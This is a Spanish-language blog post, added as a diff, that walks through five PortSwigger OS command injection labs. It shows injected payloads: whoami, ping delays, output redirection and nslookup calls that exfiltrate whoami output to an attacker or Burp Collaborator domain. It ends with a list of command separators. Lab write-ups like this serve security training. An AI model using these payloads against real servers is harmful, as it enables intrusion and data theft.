@@ -1,0 +1,178 @@
+---
+title: Inyeccion de comandos
+date: '2024-05-09'
+lastmod: '2023-08-05'
+tags: ['Portswigger', 'Injection', 'Labs']
+draft: false
+summary: 'La inyección de comandos permite a un atacante ejecutar comandos del sistema operativo (OS) en el servidor que está ejecutando una aplicación, lo que generalmente compromete por completo la aplicación y sus datos.'
+images: ['/static/images/htb/ewpt']
+---
+
+<p align="center">
+  ![Portada](https://miro.medium.com/v2/resize:fit:640/format:webp/1*HapzmTCjNvXIff_AsOCIuw.png)
+</p>
+
+Mientras me preparo para la certificación eWPTX, voy a trabajar en los laboratorios de PortSwigger. En esta publicación, voy a "robar"... tomar notas sobre la inyección de comandos en el sistema operativo (OS) y resolver los laboratorios. ¡Vamos a empezar!
+
+<TOCInline toc={props.toc} exclude="Introduccion" />
+
+## ¿Qué es la inyección de comandos OS?
+
+La inyección de comandos OS permite a un atacante ejecutar comandos del sistema operativo en el servidor que ejecuta una aplicación, lo que generalmente compromete completamente la aplicación y sus datos.
+
+### Laboratorio 1 - Inyección de comandos OS, caso simple
+
+> Este laboratorio contiene una vulnerabilidad de inyección de comandos OS en el verificador de stock de productos. La aplicación ejecuta un comando de shell que contiene los IDs de producto y tienda suministrados por el usuario, y devuelve la salida en bruto del comando en su respuesta. Para resolver el laboratorio, ejecuta el comando `whoami` para determinar el nombre del usuario actual.
+
+Vamos a la página y hacemos clic en el botón "View Details".
+![Imagen 1](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/1.png)
+
+Cuando hacemos clic en "Check Stock", se envía una solicitud con los parámetros `productId=1&storeId=2` a `/product/stock`.
+![Imagen 2](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/2.png)
+![Imagen 3](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/3.png)
+
+Cambiamos `storeId=2` por ...
+
+```bash
+productId=1&storeId=| whoami
+```
+
+y nos muestra el nombre.
+![Imagen 4](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/4.png)
+
+## Vulnerabilidades de inyección de comandos OS ciegas
+
+### Detección de inyección de comandos OS ciegas usando retrasos de tiempo
+
+Puedes usar un comando inyectado para activar un retraso de tiempo, permitiéndote confirmar que el comando se ejecutó según el tiempo que tarda la aplicación en responder. El comando `ping` es una buena forma de hacer esto, ya que te permite especificar el número de paquetes ICMP a enviar.
+
+```
+& ping -c 10 127.0.0.1 &
+```
+
+### Laboratorio 2 - Inyección de comandos OS ciegas con retrasos de tiempo
+
+> Este laboratorio contiene una vulnerabilidad de inyección de comandos OS ciegas en la función de retroalimentación. La aplicación ejecuta un comando de shell que contiene los detalles suministrados por el usuario. La salida del comando no se devuelve en la respuesta. Para resolver el laboratorio, explota la vulnerabilidad de inyección de comandos OS ciegas para causar un retraso de 10 segundos.
+
+Vamos a la página de "Submit feedback".
+![Imagen 1](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/1.png)
+
+En el formulario ponemos cualquier dato, lo enviamos y lo capturamos con Burpsuite.
+![Imagen 2](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/2.png)
+![Imagen 3](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/3.png)
+
+Después de probar en todos los parámetros con la carga útil...
+
+```
+| ping -c 10 127.0.0.1 &
+```
+
+Codificado en URL...
+
+```
+|+ping+-c+10+127.0.0.1+%26
+```
+
+¡Vemos un retraso de 9,440 milisegundos! 🥳
+![Imagen 4](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/4.png)
+
+### Explotando la inyección de comandos OS ciegas redirigiendo la salida
+
+Puedes redirigir la salida del comando inyectado a un archivo. El carácter `>` envía la salida del comando `whoami` al archivo especificado. Por ejemplo:
+
+```
+& whoami > /var/www/static/whoami.txt &
+```
+
+### Laboratorio 3 - Inyección de comandos OS ciegas con redirección de salida
+
+> Este laboratorio contiene una vulnerabilidad de inyección de comandos OS ciegas en la función de retroalimentación. La aplicación ejecuta un comando de shell que contiene los detalles suministrados por el usuario. La salida del comando no se devuelve en la respuesta. Sin embargo, puedes usar la redirección de salida para capturar la salida del comando. Hay una carpeta escribible en: `/var/www/images/`. La aplicación sirve las imágenes para el catálogo de productos desde esta ubicación. Puedes redirigir la salida del comando inyectado a un archivo en esta carpeta y luego usar la URL de carga de imágenes para recuperar el contenido del archivo. Para resolver el laboratorio, ejecuta el comando `whoami` y recupera la salida.
+
+Mismo procedimiento que en el laboratorio anterior: vamos a la página de "Submit Feedback", llenamos el formulario, lo enviamos y capturamos la solicitud.
+![Imagen 1](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab3/1.png)
+
+Buscamos el parámetro donde inyectar el comando:
+
+```
+| whoami > /var/images/www/quiensoy.txt &
+```
+
+![Imagen 2](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab3/2.png)
+![Imagen 3](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab3/3.png)
+
+### Explotando la inyección de comandos OS ciegas usando técnicas OAST
+
+Puedes usar un comando inyectado que desencadenará una interacción de red fuera de banda con un sistema que controles, utilizando técnicas OAST.
+
+```
+& nslookup kgji2ohoyw.web-attacker.com &
+```
+
+### Laboratorio 4 - Inyección de comandos OS ciegas con interacción fuera de banda
+
+> Este laboratorio contiene una vulnerabilidad de inyección de comandos OS ciegas en la función de retroalimentación. La aplicación ejecuta un comando de shell que contiene los detalles suministrados por el usuario. El comando se ejecuta de manera asíncrona y no tiene efecto en la respuesta de la aplicación. No es posible redirigir la salida a una ubicación a la que puedas acceder. Sin embargo, puedes desencadenar interacciones fuera de banda con un dominio externo. Para resolver el laboratorio, explota la vulnerabilidad de inyección de comandos OS ciegas para realizar una consulta DNS a Burp Collaborator.
+
+Mismo procedimiento 😮‍💨... Copia la URL de Burp Collaborator (¡Cómpralo! 😉)
+
+```
+| nslookup 2be44phd8284tgglwr1sf7ytekkb81wq.oastify.com &
+```
+
+¡Y voilà!
+![Imagen 1](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab4/1.png)
+![Imagen 2](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab4/2.png)
+
+### Siguiente paso
+
+El canal fuera de banda proporciona una forma sencilla de exfiltrar la salida de los comandos inyectados.
+
+```
+& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+```
+
+Esto provoca una consulta DNS al dominio del atacante que contiene el resultado del comando `whoami`:
+
+```
+wwwuser.kgji2ohoyw.web-attacker.com
+```
+
+### Laboratorio 5 - Inyección de comandos OS ciegas con exfiltración de datos fuera de banda
+
+> Este laboratorio contiene una vulnerabilidad de inyección de comandos OS ciegas en la función de retroalimentación. La aplicación ejecuta un comando de shell que contiene los detalles suministrados por el usuario. El comando se ejecuta de manera asíncrona y no tiene efecto en la respuesta de la aplicación. No es posible redirigir la salida a una ubicación a la que puedas acceder. Sin embargo, puedes desencadenar interacciones fuera de banda con un dominio externo. Para resolver el laboratorio, ejecuta el comando `whoami` y exfiltra la salida a través de una consulta DNS a Burp Collaborator. Deberás ingresar el nombre del usuario actual para completar el laboratorio.
+
+🏃‍♀️ Ve a la página de "Submit Feedback", 🏃‍♀️ llena el formulario, 🏃‍♀️ envíalo, 🏃‍♀️ captura la solicitud, copia el enlace de Burp Collaborator (¡CÓMPRALO! 😉⬇️)
+
+```
+| nslookup 'whoami'.blablablablabla.whatever.com &
+```
+
+![Imagen 1](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab5/1.png)
+![Imagen 2](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab5/2.png)
+![Imagen 3](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab5/3.png)
+
+## Formas de inyectar comandos OS
+
+Los siguientes separadores de comandos funcionan tanto en sistemas Windows como Unix:
+
+```
+&
+&&
+|
+||
+```
+
+Unix
+
+```
+;
+0x0a
+\n
+```
+
+## Recursos
+
+[Portswigger](https://portswigger.net/web-security/os-command-injection)
+
+[HackTheBox](https://academy.hackthebox.com/module/details/109)
+
+[INE](https://ine.com/blog/command-injection)
